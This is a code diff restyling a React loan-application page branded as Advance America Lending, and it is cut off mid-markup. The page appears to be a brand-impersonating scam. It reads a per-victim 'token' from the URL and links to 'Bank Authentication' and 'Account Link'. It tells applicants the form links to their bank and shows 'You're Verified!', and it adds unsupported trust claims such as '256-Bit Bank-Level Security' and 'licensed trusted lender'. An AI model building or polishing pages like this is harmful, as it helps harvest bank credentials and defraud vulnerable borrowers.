@@ -29,159 +29,352 @@ const AALogo = () => (
     alt="Advance America Lending logo" 
     style={{ width: 'auto', height: '40px', objectFit: 'contain' }} 
     onError={(e) => {
-      e.currentTarget.onerror = null; // Prevent infinite loop if fallback also fails
+      e.currentTarget.onerror = null;
       e.currentTarget.src = "/advance-america-logo.jpg";
     }}
   />
 );
 
 const CSS = `
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');
+
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:'Poppins',sans-serif;}
+body{font-family:'Inter',sans-serif; background-color: #f8fafc; color: #0f172a;}
+
 :root{
-  --aa-navy: #1f2937;
-  --aa-navy-dark: #111827;
-  --aa-primary: #fbbc04;
-  --aa-primary-h: #dfa300;
-  --aa-black: #000000;
-  --aa-light-bg: #f8f9fa;
-  --aa-border: #e2e8f0;
-  --aa-text: #1a202c;
-  --aa-muted: #718096;
+  --gold: #fbbc04;
+  --gold-hover: #e5a800;
+  --navy: #0f172a;
+  --bg-subtle: #f8fafc;
+  --text-muted: #64748b;
+  --border: #e2e8f0;
 }
-/* Nav */
-.aa-nav{background:#fff;border-bottom:1px solid var(--aa-border);position:sticky;top:0;z-index:200;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
-.aa-nav-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:70px;display:flex;align-items:center;justify-content:space-between;}
-.aa-logo-wrap{display:flex;align-items:center;gap:12px;text-decoration:none;}
-.aa-nav-links{display:flex;align-items:center;gap:24px;}
-.aa-nav-item{position:relative;font-size:14px;font-weight:600;color:var(--aa-navy);text-decoration:none;cursor:pointer;transition:color 0.2s;}
-.aa-nav-item:hover{color:var(--aa-primary-h);}
-.aa-btn-nav{background:var(--aa-black);color:#fff;border:none;padding:10px 28px;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;text-decoration:none;display:inline-block;}
-.aa-btn-nav:hover{background:#333;transform:translateY(-1px);}
 
-.aa-btn-primary{background:var(--aa-primary);color:#111;border:none;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.2s;text-decoration:none;display:inline-block;}
-.aa-btn-primary:hover{background:var(--aa-primary-h);transform:translateY(-1px);box-shadow:0 4px 12px rgba(251,188,4,0.3);}
+/* Typography */
+h1, h2, h3, h4 { font-family: 'Outfit', sans-serif; }
 
-/* Hero */
-.aa-hero{background-image:url('https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1440,h=756,fit=crop,f=jpeg/YD0EMK5bgBTZPx84/advance-america-YbN4pkJxywhZZZ4p.jpeg');background-size:cover;background-position:center;color:#fff;padding:80px 20px;position:relative;overflow:hidden;}
-.aa-hero-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;gap:60px;position:relative;z-index:10;}
-.background-video-container{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;background:rgba(0,0,0,0.5);}
-.background-video{width:100%;height:100%;object-fit:cover;opacity:0.6;}
-.aa-hero-content{flex:1;text-align:center;display:flex;flex-direction:column;align-items:center;}
-.aa-hero h1{font-size:clamp(28px,4.5vw,48px);font-weight:600;line-height:1.2;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px;}
-.aa-hero p{font-size:18px;color:rgba(255,255,255,0.9);margin:0 auto 30px;line-height:1.6;max-width:600px;}
+/* Navigation */
+.aa-top-bar {
+  background: var(--navy);
+  color: white;
+  padding: 8px 24px;
+  font-size: 13px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-weight: 500;
+  letter-spacing: 0.5px;
+}
+.aa-nav {
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(12px);
+  position: sticky;
+  top: 0;
+  z-index: 50;
+  border-bottom: 1px solid var(--border);
+}
+.aa-nav-inner {
+  max-width: 1280px;
+  margin: 0 auto;
+  height: 80px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0 24px;
+}
+.aa-logo-wrap { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+.aa-btn-nav {
+  background: var(--gold);
+  color: var(--navy);
+  padding: 12px 28px;
+  border-radius: 30px;
+  font-weight: 700;
+  font-size: 15px;
+  text-decoration: none;
+  font-family: 'Outfit', sans-serif;
+  transition: all 0.2s ease;
+  box-shadow: 0 4px 14px rgba(251, 188, 4, 0.3);
+}
+.aa-btn-nav:hover { background: var(--gold-hover); transform: translateY(-2px); box-shadow: 0 6px 20px rgba(251, 188, 4, 0.4); }
 
-/* Stats Banner */
-.aa-stats-banner{background:#fff;border-bottom:1px solid var(--aa-border);padding:30px 20px;}
-.aa-stats-inner{max-width:1200px;margin:0 auto;display:flex;justify-content:space-around;flex-wrap:wrap;gap:20px;}
-.aa-stat{text-align:center;}
-.aa-stat-num{font-size:32px;font-weight:800;color:var(--aa-navy);line-height:1;}
-.aa-stat-label{font-size:13px;color:var(--aa-muted);text-transform:uppercase;font-weight:600;margin-top:8px;letter-spacing:1px;}
+/* Hero Section */
+.aa-hero {
+  position: relative;
+  min-height: 80vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  padding: 60px 24px;
+}
+.aa-hero-bg {
+  position: absolute;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background-image: url('/aa-hero-family.png');
+  background-size: cover;
+  background-position: center;
+  background-attachment: fixed;
+  z-index: 0;
+}
+.aa-hero-overlay {
+  position: absolute;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: linear-gradient(to right, rgba(15, 23, 42, 0.95) 0%, rgba(15, 23, 42, 0.7) 50%, rgba(15, 23, 42, 0.3) 100%);
+  z-index: 1;
+}
+.aa-hero-content {
+  position: relative;
+  z-index: 2;
+  max-width: 1280px;
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  color: white;
+}
+.aa-badge-trust {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(255, 255, 255, 0.1);
+  padding: 8px 16px;
+  border-radius: 20px;
+  border: 1px solid rgba(255,255,255,0.2);
+  font-size: 13px;
+  font-weight: 500;
+  backdrop-filter: blur(10px);
+  margin-bottom: 24px;
+}
+.aa-hero h1 {
+  font-size: clamp(40px, 6vw, 64px);
+  line-height: 1.1;
+  font-weight: 800;
+  max-width: 700px;
+  margin-bottom: 24px;
+  text-shadow: 0 4px 20px rgba(0,0,0,0.4);
+}
+.aa-hero h1 span { color: var(--gold); }
+.aa-hero p {
+  font-size: 18px;
+  line-height: 1.6;
+  max-width: 500px;
+  color: #cbd5e1;
+  margin-bottom: 40px;
+}
+.aa-hero-actions { display: flex; gap: 16px; align-items: center; }
 
-/* Section */
-.aa-section{padding:80px 20px;}
-.aa-section.light{background:var(--aa-light-bg);}
-.aa-title-center{text-align:center;margin-bottom:50px;}
-.aa-sec-eyebrow{font-size:13px;font-weight:700;color:var(--aa-primary-h);text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;}
-.aa-sec-title{font-size:36px;font-weight:800;color:var(--aa-navy);line-height:1.2;}
+/* The Application Form Layout */
+.aa-main-layout {
+  max-width: 1280px;
+  margin: -60px auto 100px;
+  padding: 0 24px;
+  position: relative;
+  z-index: 10;
+}
+.aa-form-grid {
+  display: grid;
+  grid-template-columns: 350px 1fr;
+  gap: 40px;
+  align-items: start;
+}
+@media (max-width: 900px) {
+  .aa-form-grid { grid-template-columns: 1fr; }
+}
 
-/* Services Grid */
-.aa-services{display:grid;grid-template-columns:repeat(auto-fit, minmax(300px, 1fr));gap:30px;max-width:1200px;margin:0 auto;}
-.aa-service-card{background:#fff;border-radius:12px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,0.04);transition:transform 0.3s;border:1px solid var(--aa-border);}
-.aa-service-card:hover{transform:translateY(-5px);border-color:var(--aa-primary);}
-.aa-service-icon{width:60px;height:60px;background:rgba(251,188,4,0.1);border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:20px;color:var(--aa-primary-h);}
-.aa-service-card h3{font-size:20px;font-weight:700;color:var(--aa-navy);margin-bottom:12px;}
-.aa-service-card p{font-size:15px;color:var(--aa-muted);line-height:1.6;}
+/* Sidebar Info */
+.aa-sidebar {
+  display: flex;
+  flex-direction: column;
+  gap: 24px;
+}
+.aa-sidebar-card {
+  background: #fff;
+  border-radius: 20px;
+  padding: 32px;
+  box-shadow: 0 20px 40px rgba(15, 23, 42, 0.06);
+  border: 1px solid var(--border);
+}
+.aa-sidebar-card img {
+  width: 100%;
+  height: 200px;
+  object-fit: cover;
+  border-radius: 12px;
+  margin-bottom: 20px;
+}
+.aa-sidebar-card h3 {
+  font-size: 20px;
+  color: var(--navy);
+  margin-bottom: 12px;
+  font-weight: 700;
+}
+.aa-sidebar-card p {
+  font-size: 14px;
+  color: var(--text-muted);
+  line-height: 1.6;
+}
 
-/* Form */
-.aa-form-wrap{max-width:800px;margin:0 auto;background:#fff;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.08);overflow:hidden;}
-.aa-form-header{background:var(--aa-navy);color:#fff;padding:30px 40px;position:relative;}
-.aa-form-header h2{font-size:24px;font-weight:800;margin-bottom:8px;}
-.aa-form-header p{font-size:14px;color:rgba(255,255,255,0.8);}
-.aa-form-body{padding:40px;}
-.aa-fg-label{color:var(--aa-navy);font-size:18px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:2px solid var(--aa-light-bg);}
-.aa-g2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
-.aa-g3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:20px;}
-@media(max-width:640px){.aa-g2,.aa-g3{grid-template-columns:1fr;}}
-.aa-lbl{display:block;font-size:13px;font-weight:600;color:var(--aa-navy);margin-bottom:6px;}
-.aa-in{width:100%;height:48px;border:1px solid #cbd5e1;border-radius:6px;padding:0 16px;font-size:15px;font-family:inherit;color:var(--aa-text);background:#fff;transition:border-color 0.2s;outline:none;}
-.aa-in:focus{border-color:var(--aa-primary);box-shadow:0 0 0 3px rgba(251,188,4,0.2);}
-.aa-in::placeholder{color:#94a3b8;}
-.aa-err{font-size:12px;color:#e11d48;margin-top:4px;}
-.aa-fgroup{margin-bottom:20px;}
-.aa-sec-group{margin-bottom:40px;}
-.aa-icon-field{position:relative;}
-.aa-icon-field input{padding-right:40px;}
-.aa-icon-field .fi{position:absolute;right:14px;top:50%;transform:translateY(-50%);color:#94a3b8;}
-.aa-client-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(251,188,4,0.1);color:var(--aa-primary-h);border:1px solid rgba(251,188,4,0.3);border-radius:4px;padding:12px 20px;font-size:14px;font-weight:600;margin-bottom:30px;width:100%;}
-.aa-submit{width:100%;height:56px;background:var(--aa-primary);color:#111;border:none;font-size:16px;font-weight:700;border-radius:30px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;transition:background 0.2s;}
-.aa-submit:hover:not(:disabled){background:var(--aa-primary-h);}
-.aa-submit:disabled{opacity:0.7;cursor:not-allowed;}
-.aa-fine{font-size:12px;color:var(--aa-muted);text-align:center;margin-top:20px;line-height:1.6;}
+/* The Progressive Form */
+.aa-form-container {
+  background: #fff;
+  border-radius: 24px;
+  box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08);
+  border: 1px solid var(--border);
+  overflow: hidden;
+}
+.aa-form-header {
+  background: var(--navy);
+  color: white;
+  padding: 40px;
+}
+.aa-form-header h2 { font-size: 28px; margin-bottom: 8px; font-weight: 700;}
+.aa-form-header p { font-size: 15px; color: #cbd5e1; }
+
+.aa-form-stepper {
+  padding: 40px;
+  display: flex;
+  flex-direction: column;
+  gap: 50px;
+}
+
+/* Form Section Styling */
+.aa-section {
+  position: relative;
+}
+.aa-section-title {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  font-family: 'Outfit', sans-serif;
+  font-size: 24px;
+  font-weight: 700;
+  color: var(--navy);
+  margin-bottom: 30px;
+  padding-bottom: 16px;
+  border-bottom: 2px solid var(--bg-subtle);
+}
+.aa-step-indicator {
+  width: 40px; height: 40px;
+  background: var(--gold);
+  color: var(--navy);
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  font-weight: 800;
+  box-shadow: 0 4px 12px rgba(251, 188, 4, 0.3);
+}
+.aa-grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+.aa-grid-3 { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 24px; }
+@media (max-width: 640px) {
+  .aa-grid-2, .aa-grid-3 { grid-template-columns: 1fr; }
+}
+
+/* Inputs */
+.aa-fgroup { display: flex; flex-direction: column; gap: 8px; }
+.aa-lbl { font-size: 14px; font-weight: 600; color: var(--navy); }
+.aa-in {
+  width: 100%;
+  height: 52px;
+  border: 2px solid #e2e8f0;
+  border-radius: 12px;
+  padding: 0 16px;
+  font-size: 15px;
+  font-family: 'Inter', sans-serif;
+  color: var(--navy);
+  background: #f8fafc;
+  transition: all 0.2s ease;
+  outline: none;
+}
+.aa-in:focus {
+  border-color: var(--gold);
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(251, 188, 4, 0.15);
+}
+.aa-in::placeholder { color: #94a3b8; }
+.aa-err { font-size: 13px; color: #ef4444; font-weight: 500; display: flex; align-items: center; gap:4px; }
+
+/* Icon Inputs */
+.aa-icon-input { position: relative; }
+.aa-icon-input input { padding-left: 44px; }
+.aa-field-icon {
+  position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+  color: #94a3b8;
+}
+
+/* Secure Banner */
+.aa-secure-banner {
+  background: linear-gradient(to right, rgba(16, 185, 129, 0.1), rgba(16, 185, 129, 0.05));
+  border: 1px solid rgba(16, 185, 129, 0.2);
+  border-radius: 12px;
+  padding: 16px 24px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 30px;
+  color: #047857;
+  font-weight: 500;
+  font-size: 14px;
+}
+.aa-secure-banner svg { color: #10b981; }
+
+/* Submit Area */
+.aa-submit-area {
+  background: #f8fafc;
+  padding: 40px;
+  border-top: 1px solid var(--border);
+  text-align: center;
+}
+.aa-submit-btn {
+  width: 100%;
+  max-width: 400px;
+  height: 64px;
+  border-radius: 32px;
+  background: var(--gold);
+  color: var(--navy);
+  border: none;
+  font-family: 'Outfit', sans-serif;
+  font-size: 20px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 10px 25px rgba(251, 188, 4, 0.3);
+  transition: all 0.2s;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+}
+.aa-submit-btn:hover:not(:disabled) {
+  transform: translateY(-2px);
+  box-shadow: 0 15px 35px rgba(251, 188, 4, 0.4);
+}
+.aa-submit-btn:disabled {
+  opacity: 0.7; cursor: not-allowed;
+}
 
 /* Footer */
-.aa-footer{background:var(--aa-navy-dark);color:#fff;padding:60px 20px 30px;}
-.aa-ft-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:40px;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:40px;margin-bottom:30px;}
-.aa-ft-brand p{font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;margin-top:16px;line-height:1.6;}
-.aa-ft-contact a{display:block;color:var(--aa-primary);font-size:14px;font-weight:600;margin-bottom:8px;text-decoration:none;}
-.aa-fb{text-align:center;font-size:13px;color:rgba(255,255,255,0.5);}
+.aa-footer{background:var(--navy);color:#fff;padding:80px 24px 40px;}
+.aa-ft-inner{max-width:1280px;margin:0 auto;display:flex;flex-wrap:wrap;gap:60px;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:60px;margin-bottom:40px;}
+.aa-ft-contact a{color:var(--gold);font-weight:600;text-decoration:none;font-size:15px;}
+.aa-fb{text-align:center;font-size:14px;color:rgba(255,255,255,0.5);}
 
 @keyframes spin{to{transform:rotate(360deg);}}
-@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
-@keyframes bounce{0%,20%,53%,80%,to{transform:translate3d(0,0,0);}40%,43%{transform:translate3d(0,-30px,0);}70%{transform:translate3d(0,-15px,0);}90%{transform:translate3d(0,-4px,0);}}
-@keyframes slideIn{from{opacity:0;transform:translateX(-100px);}to{opacity:1;transform:translateX(0);}}
-.aa-spin{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
-
-@media(max-width:900px){
-  .aa-hero-inner{flex-direction:column;text-align:center;}
-  .aa-hero p{margin:0 auto 30px;}
-  .aa-nav-links{display:none;}
-}
+.aa-spin{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#111;border-radius:50%;animation:spin 0.8s linear infinite;}
 `;
 
-const ShieldIcon = () => (
-  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-);
-const LockIcon = () => (
-  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-);
-const UserIcon = () => (
-  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-);
-const BriefcaseIcon = () => (
-  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
-);
-const BankIcon = () => (
-  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg>
-);
-const StarRating = () => (
-  <svg width="100" height="20" viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-    {[0,20,40,60,80].map(x => (
-      <path key={x} d={`M${10+x} 2l2.5 6.5H20l-6 4.5 2.5 6.5-6-5-6 5 2.5-6.5-6-4.5h7.5L${10+x} 2z`} fill="#F59E0B"/>
-    ))}
-  </svg>
-);
+const ShieldCheckIcon = () => <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>;
+const LockIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>;
+const UserIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>;
+const BriefcaseIcon = () => <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="14" x="2" y="7" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>;
+const BuildingIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect width="16" height="20" x="4" y="2" rx="2" ry="2"/><path d="M9 22v-4h6v4"/><path d="M8 6h.01"/><path d="M16 6h.01"/><path d="M12 6h.01"/><path d="M12 10h.01"/><path d="M12 14h.01"/><path d="M16 10h.01"/><path d="M16 14h.01"/><path d="M8 10h.01"/><path d="M8 14h.01"/></svg>;
 
 export default function AdvanceAmericaApply() {
   const [searchParams] = useSearchParams();
   const [client, setClient] = useState<any>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitted, setSubmitted] = useState(false);
-  const [loanAmount, setLoanAmount] = useState('');
-  const [interestRate, setInterestRate] = useState('');
-  const [term, setTerm] = useState('');
-  const [monthlyPayment, setMonthlyPayment] = useState<number | null>(null);
-  const [activeTool, setActiveTool] = useState('loan-calculator');
-  // Credit Simulator
-  const [currentScore, setCurrentScore] = useState(720);
-  const [projectedScore, setProjectedScore] = useState(720);
-  // Debt Consolidation
-  const [debts, setDebts] = useState([{ balance: 8500, rate: 18.99, payment: 255, name: 'Credit Card 1' }, { balance: 12000, rate: 22.49, payment: 360, name: 'Credit Card 2' }]);
-  const [consolidationRate, setConsolidationRate] = useState(9.99);
-  const [consolidationTerm, setConsolidationTerm] = useState(48);
 
-  useEffect(() => { document.title = "Advance America - Bad Credit Loans | Advance America Lending"; }, []);
+  useEffect(() => { document.title = "Advance America - Connect with Funds Securely"; }, []);
 
   useEffect(() => {
     const token = searchParams.get("token");
@@ -240,419 +433,260 @@ export default function AdvanceAmericaApply() {
     } finally { setIsSubmitting(false); }
   };
 
-  const handleCalculate = (e: React.FormEvent) => {
-    e.preventDefault();
-    const principal = parseFloat(loanAmount);
-    const rate = parseFloat(interestRate) / 100 / 12;
-    const months = parseFloat(term) * 12;
-    const payment = (principal * rate) / (1 - Math.pow(1 + rate, -months));
-    setMonthlyPayment(payment);
-  };
-
-  const handleCreditSimulate = () => {
-    // Simple simulation: adjust score based on factors
-    let score = currentScore;
-    // For demo, add some points
-    score += 20;
-    setProjectedScore(score);
-  };
-
-  const calculateDebtConsolidation = () => {
-    const totalDebt = debts.reduce((sum, debt) => sum + debt.balance, 0);
-    const totalCurrentPayment = debts.reduce((sum, debt) => sum + debt.payment, 0);
-    const consolidationPayment = (totalDebt * (consolidationRate / 100 / 12)) / (1 - Math.pow(1 + (consolidationRate / 100 / 12), -consolidationTerm));
-    const savings = totalCurrentPayment - consolidationPayment;
-    return { totalDebt, totalCurrentPayment, consolidationPayment, savings };
-  };
-
   if (submitted) return (
-    <div style={{minHeight:"100vh",background:"var(--aa-light-bg)",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Poppins',sans-serif"}}>
+    <div style={{minHeight:"100vh",background:"#f8fafc",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Inter',sans-serif"}}>
       <style>{CSS}</style>
-      <div style={{background:"#fff",borderRadius:16,padding:"50px 40px",maxWidth:480,textAlign:"center",boxShadow:"0 10px 40px rgba(0,0,0,0.08)"}}>
-        <div style={{width:72,height:72,borderRadius:"50%",background:"rgba(251,188,4,0.1)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px"}}>
-          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--aa-primary)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <div style={{background:"#fff",border:"1px solid #e2e8f0",borderRadius:24,padding:"60px 40px",maxWidth:500,textAlign:"center",boxShadow:"0 20px 40px rgba(15,23,42,0.06)"}}>
+        <div style={{width:80,height:80,borderRadius:"50%",background:"var(--gold)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 30px",boxShadow:"0 10px 25px rgba(251,188,4,0.3)"}}>
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--navy)" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
         </div>
-        <h2 style={{fontSize:26,fontWeight:800,color:"var(--aa-navy)",marginBottom:12}}>Application Received!</h2>
-        <p style={{fontSize:16,color:"var(--aa-muted)",lineHeight:1.6}}>Thank you for choosing Advance America Funds. Our lending team will review your details and contact you shortly.</p>
-        <button onClick={() => window.location.href="/"} className="aa-btn-primary" style={{marginTop:30}}>Return Home</button>
+        <h2 style={{fontSize:32,fontWeight:800,fontFamily:"'Outfit',sans-serif",color:"var(--navy)",marginBottom:16}}>You're Verified!</h2>
+        <p style={{fontSize:16,color:"var(--text-muted)",lineHeight:1.6,marginBottom:40}}>We have securely received your application. Our underwriting team is reviewing your profile and will be in touch shortly regarding approval.</p>
+        <button onClick={() => window.location.href="/"} className="aa-submit-btn" style={{height: 56, fontSize:18}}>Back to Homepage</button>
       </div>
     </div>
   );
 
   return (
-    <div style={{fontFamily:"'Poppins',sans-serif",color:"var(--aa-text)",background:"#fff"}}>
+    <>
       <style>{CSS}</style>
 
-      {/* Nav */}
+      {/* Top Banner */}
+      <div className="aa-top-bar">
+        <span>Advance America is a licensed trusted lender</span>
+        <span><LockIcon/> 256-Bit Bank-Level Security</span>
+      </div>
+
+      {/* Sticky Navigation */}
       <nav className="aa-nav">
         <div className="aa-nav-inner">
-          <a href="#" className="aa-logo-wrap">
+          <a href="/" className="aa-logo-wrap">
             <AALogo />
-            <div className="aa-logo-text">
-              <span className="aa-logo-main">Advance America</span>
-              <span className="aa-logo-sub">Funds & Lending</span>
+            <div style={{display:'flex', flexDirection:'column'}}>
+               <span style={{fontFamily:"'Outfit',sans-serif", fontWeight:800, fontSize:18, color:"var(--navy)", lineHeight:1}}>Advance America</span>
+               <span style={{fontFamily:"'Inter',sans-serif", fontWeight:500, fontSize:11, color:"var(--text-muted)", letterSpacing:0.5}}>FUNDS & LENDING</span>
             </div>
           </a>
-          <div className="aa-nav-links">
-            <a href="#" className="aa-nav-item">Home</a>
-            <a href="#" className="aa-nav-item">Loans</a>
-            <a href="#" className="aa-nav-item">Services</a>
-            <a href="#" className="aa-nav-item">Bank Authentication</a>
-            <a href="#" className="aa-btn-nav">Account Link</a>
-          </div>
+          <a href="#apply" className="aa-btn-nav">Apply Now</a>
         </div>
       </nav>
 
-      {/* Hero */}
-      <section className="aa-hero">
-        <div className="background-video-container">
-          <video autoPlay loop muted playsInline className="background-video" poster="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1440,h=756,fit=crop,f=jpeg/YD0EMK5bgBTZPx84/advance-america-YbN4pkJxywhZZZ4p.jpeg">
-            <source src="https://assets.zyrosite.com/YD0EMK5bgBTZPx84/traffic.txt" type="video/mp4" />
-          </video>
+      {/* Cinematic Hero */}
+      <header className="aa-hero">
+        <div className="aa-hero-bg"></div>
+        <div className="aa-hero-overlay"></div>
+        <div className="aa-hero-content">
+          <div className="aa-badge-trust">
+            <StarRating/> Over 150,000 Families Funded
+          </div>
+          <h1><span>Fast funding</span> for<br/>life's bigger moments.</h1>
+          <p>Get a decision in minutes and funds in your account by tomorrow. Whether it's home repairs, debt consolidation, or a new vehicle, we're here to help.</p>
+          <div className="aa-hero-actions">
+            <button className="aa-submit-btn" onClick={()=>document.getElementById('apply')?.scrollIntoView({behavior:'smooth'})} style={{width:'auto', padding:'0 40px'}}>Start Application</button>
+            <span style={{color:'#fff', opacity:0.8, fontSize:14}}><ShieldCheckIcon/> No impact to credit score to check rates</span>
+          </div>
         </div>
-        <div className="aa-hero-inner">
-          <div className="aa-hero-content">
-            <h1>Advance America - Bad Credit Loans</h1>
-            <div style={{display:"flex",alignItems:"center",gap:"10px",fontSize:"13px",fontWeight:600,marginBottom:"20px"}}>
-              <StarRating/> 4.8 out of 5
+      </header>
+
+      {/* Main Form Layout */}
+      <main className="aa-main-layout" id="apply">
+        <div className="aa-form-grid">
+          
+          {/* Left Sidebar (Visual Storytelling) */}
+          <aside className="aa-sidebar">
+            <div className="aa-sidebar-card">
+              <img src="/aa-phone-app.png" alt="Fast Online Application" />
+              <h3>100% Digital Process</h3>
+              <p>Skip the branch lines. Our application is completely online and automatically securely links to your verified banking institution.</p>
             </div>
-            <p>Discover flexible lending solutions at Advance America, specializing in bad credit loans, collateral loans, and gold-backed loans with guaranteed repayment options.</p>
-            <a href="#apply" className="aa-btn-primary" style={{padding:"14px 32px",fontSize:"16px"}}>Get Started</a>
-          </div>
-        </div>
-      </section>
-
-      {/* Trust Pilot */}
-      <div style={{textAlign:"center",padding:"20px",background:"var(--aa-light-bg)"}}>
-        <h3>Your Trusted Lending Partner</h3>
-        <p>we specialize in providing reliable lending solutions to help you achieve your financial goals. Bad credit score approved on the same day!</p>
-      </div>
-
-      {/* Stats */}
-      <div className="aa-stats-banner">
-        <div className="aa-stats-inner">
-          <div className="aa-stat">
-            <div className="aa-stat-num">150+</div>
-            <div className="aa-stat-label">Trusted Partners</div>
-          </div>
-          <div className="aa-stat">
-            <div className="aa-stat-num">158,874+</div>
-            <div className="aa-stat-label">Happy Customers</div>
-          </div>
-          <div className="aa-stat">
-            <div className="aa-stat-num">24/7</div>
-            <div className="aa-stat-label">Support Available</div>
-          </div>
-        </div>
-      </div>
-
-      {/* Services */}
-      <section className="aa-section light">
-        <div className="aa-title-center">
-          <div className="aa-sec-eyebrow">Our Services</div>
-          <h2 className="aa-sec-title">Explore diverse lending solutions</h2>
-        </div>
-        <div className="aa-services">
-          <div className="aa-service-card">
-            <div className="aa-service-icon">
